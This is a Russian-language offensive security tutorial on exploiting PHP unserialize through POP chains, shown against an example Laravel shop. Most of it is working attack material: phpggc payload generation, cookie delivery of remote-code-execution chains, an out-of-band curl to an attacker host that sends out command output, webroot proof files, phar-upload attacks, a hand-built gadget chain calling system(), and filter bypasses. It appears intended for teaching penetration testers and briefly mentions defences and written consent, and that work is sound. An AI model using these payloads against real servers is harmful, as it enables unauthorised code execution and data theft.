## Вопрос, с которого всё начинается

Мы разобрали десериализацию в Python, Node и Ruby. У PHP она стоит на **магических методах** — специальных функциях вида `__wakeup`, `__destruct`, `__toString`, которые PHP вызывает автоматически в определённые моменты.

Вопрос: что, если соединить объекты так, чтобы их «магические» методы вызывали друг друга по цепочке и в конце привели к выполнению команды? Такая цепочка называется **POP chain** (Property-Oriented Programming). Разберём её на одном примере.

## Наш пример

Есть PHP-приложение на Laravel `shop.example`. Оно кладёт в cookie сериализованный объект:

```bash
$ curl -si https://shop.example/login -d 'user=bob&pass=...' | grep -i set-cookie
Set-Cookie: user=TzoyNToiQXBwXE1vZGVsXFVzZXIiOjE6e3M6NDoibmFtZSI7czozOiJib2IiO30=
```

Декодируем base64:

```bash
$ echo 'TzoyNToiQXBwXE1vZGVsXFVzZXIiOjE6e3M6NDoibmFtZSI7czozOiJib2IiO30=' | base64 -d
O:25:"App\Model\User":1:{s:4:"name";s:3:"bob";}
```

`O:25:"App\Model\User":1:{...}` — это **PHP-сериализация объекта** класса `App\Model\User` с одним свойством `name`. Символ `O:` в начале — главный признак: где-то сервер вызывает `unserialize()` на этом значении. Значит, мы контролируем, **какой класс** он восстановит.

## Шаг 1: магические методы как «кирпичики»

`unserialize` сам по себе безобиден, пока в приложении есть классы, чьи магические методы делают что-то опасное. Вот базовый словарь:

| Метод | Когда вызывается | Чем полезен |
|-------|------------------|-------------|
| `__wakeup` | при `unserialize` | срабатывает сразу |
| `__destruct` | при уничтожении объекта (конец запроса) | классический старт цепочки |
| `__toString` | при приведении к строке | срабатывает на `echo`/конкатенации |
| `__call` | вызов несуществующего метода | часто содержит `call_user_func` |
| `__get` | доступ к несуществующему свойству | может читать/писать файлы |
| `__invoke` | вызов объекта как функции | `$obj()` в чужом коде |

Цепочка разворачивается так: `unserialize($payload)` создаёт объект A → в конце запроса вызывается `A::__destruct()` → он обращается к свойству, которое тоже объект B → вызывается `B::__toString()` → внутри делается `file_put_contents` с полями объекта → контролируемый путь и содержимое → запись webshell. Классы A и B берутся из **уже загруженных библиотек** фреймворка — поэтому цепочка привязана к набору и версиям зависимостей.

## Шаг 2: читаем формат сериализации

Чтобы менять payload и не ломать его, нужно понимать формат — PHP строго проверяет **длины строк** и падает при несоответствии:

```text
O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}
```

- `O:<len>:"ClassName":<numprops>:{<key><value>...}` — объект;
- `s:<len>:"string"` — строка; `i:<int>` — число; `b:<0|1>` — boolean; `N;` — null;
- `a:<n>:{...}` — массив; `R:<id>` — ссылка на уже созданный объект (для циклов и обхода фильтров).

Если меняешь значение строки — **пересчитай длину**: `s:2:"id"` → для `whoami` нужно `s:6:"whoami"`. Проверить локально:

```bash
$ php -r 'echo serialize(new stdClass);'
$ php -r '$s="O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\";}"; var_dump(unserialize($s));'
```

## Шаг 3: phpggc — готовые цепочки

Строить POP-цепочку вручную долго, поэтому есть **phpggc** — «метасплойт» для PHP-десериализации: набор готовых цепочек под популярные фреймворки. Определяем фреймворк (по cookie `laravel_session`, `_sf2_attributes`, `/wp-content/`) и генерируем payload:

```bash
$ ./phpggc -l Laravel              # список цепочек для Laravel
$ ./phpggc -i Laravel/RCE2         # какая версия поддерживается
$ ./phpggc -b Laravel/RCE2 system id   # base64-payload, выполнит "id"
```

Отправляем:

```bash
$ curl -s "https://shop.example/" -H "Cookie: user=$(./phpggc -b Laravel/RCE2 system id)"
```

## Шаг 4: почему вывод не видно

`__destruct` срабатывает **в конце запроса**, когда ответ уже формируется, — поэтому stdout команды не попадает в тело ответа. Доказываем RCE через **OOB** (сервер стучится к тебе) или **файл-маркер**:

```bash
$ ./phpggc -b Laravel/RCE2 system 'curl http://ATTACKER:8080/$(id|base64)'
$ python3 -m http.server 8080 &
# в логе: GET /dWlkPTAod3d3LWRhdGEp
```

Или записываем результат в webroot и читаем его:

```bash
$ ./phpggc -b Laravel/RCE2 system 'id > /var/www/html/proof.txt'
$ curl -s https://shop.example/proof.txt
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`uid=33(www-data)` — команда выполнена. Артефакт получен.

## Шаг 5: phar — десериализация без `unserialize`

Отдельная мощная особенность PHP: **метаданные phar-архива** десериализуются автоматически при обращении к `phar://` — даже через обычные файловые функции: `file_exists`, `getimagesize`, `file_get_contents`, `is_file`, `stat`. То есть явного `unserialize` не нужно вовсе.

```bash
$ ./phpggc -p phar -o exploit.phar Monolog/RCE1 system id
# загружаем exploit.phar (можно замаскировать под .jpg — важен контент, не имя)
$ curl -s "https://shop.example/?file=phar://uploads/exploit.phar/test"
```

Связка «загрузка файла + любое чтение по управляемому пути» становится RCE. Это огромная поверхность: аватарки, обработка изображений, ZIP-архивы, любые функции с параметром-путём.

## Шаг 6: если готовой цепочки нет

Иногда версия фреймворка нестандартная, и подходящей цепочки в phpggc нет. Тогда строим вручную — ищем магические методы в исходниках:

```bash
$ grep -rn "__wakeup\|__destruct\|__toString\|__call" src/ vendor/ --include='*.php'
```

Схема: находим `__destruct`, который вызывает метод свойства-объекта; в том классе ищем `__call`/`__toString`, ведущий к `system`. Собираем граф объектов:

```bash
$ php -r '
class A { public $b; function __destruct(){ $this->b->run(); } }
class B { public $cmd; function run(){ system($this->cmd); } }
$a=new A; $a->b=new B; $a->b->cmd="id";
echo serialize($a);'
```

Проверяем локально `php -r 'unserialize(...)'`, затем доставляем.

## Шаг 7: обход защиты

Правильная защита — `unserialize($x, ['allowed_classes' => false])` или явный список классов. Обходы:

- если разрешены «безобидные» классы, но у одного есть опасный `__wakeup` — цепочка всё равно возможна;
- фильтр по подстроке `O:` обходится через `C:` (класс, реализующий `Serializable`) и ссылки `R:`;
- проверка только по началу строки обходится префиксом;
- «экранирование кавычек» не спасает — длину строки в payload задаёт атакующий.

## Что мы теперь знаем

- PHP-десериализация опирается на **магические методы** (`__wakeup`, `__destruct`, `__toString`).
- **POP chain** — цепочка объектов, чьи методы приводят к RCE; она зависит от библиотек фреймворка.
- `O:` в параметре/cookie — признак PHP-сериализации.
- **phpggc** генерирует готовые цепочки; флаги `-l`, `-i`, `-b`, `-u`, `-p phar`.
- Вывод не виден (деструктор) — доказываем через OOB или файл-маркер.
- **phar** десериализуется даже без `unserialize` — через файловые функции.
- Артефакт — `uid=33(www-data)`, а не «ошибка 500».

## На что смотреть дальше

- **Сначала фреймворк и версия** — цепочка привязана к версиям; `phpggc -i` печатает диапазон.
- **Не забудь про phar** — огромная поверхность без явного `unserialize`.
- **Проверяй `allowed_classes`** — если `false`, вектор закрыт.
- **Кодировка важна:** phpggc `-b` (base64) / `-u` (url-encode); неверная — payload не распарсится.
- **Длины строк вручную** пересчитывай, иначе `unserialize` вернёт `false`.
- **Только с письменного согласия.** RCE меняет состояние прода.
- **Проверь версию фреймворка и его зависимостей** (`composer.json`/`composer.lock`) — от неё зависит, какая цепочка phpggc сработает.
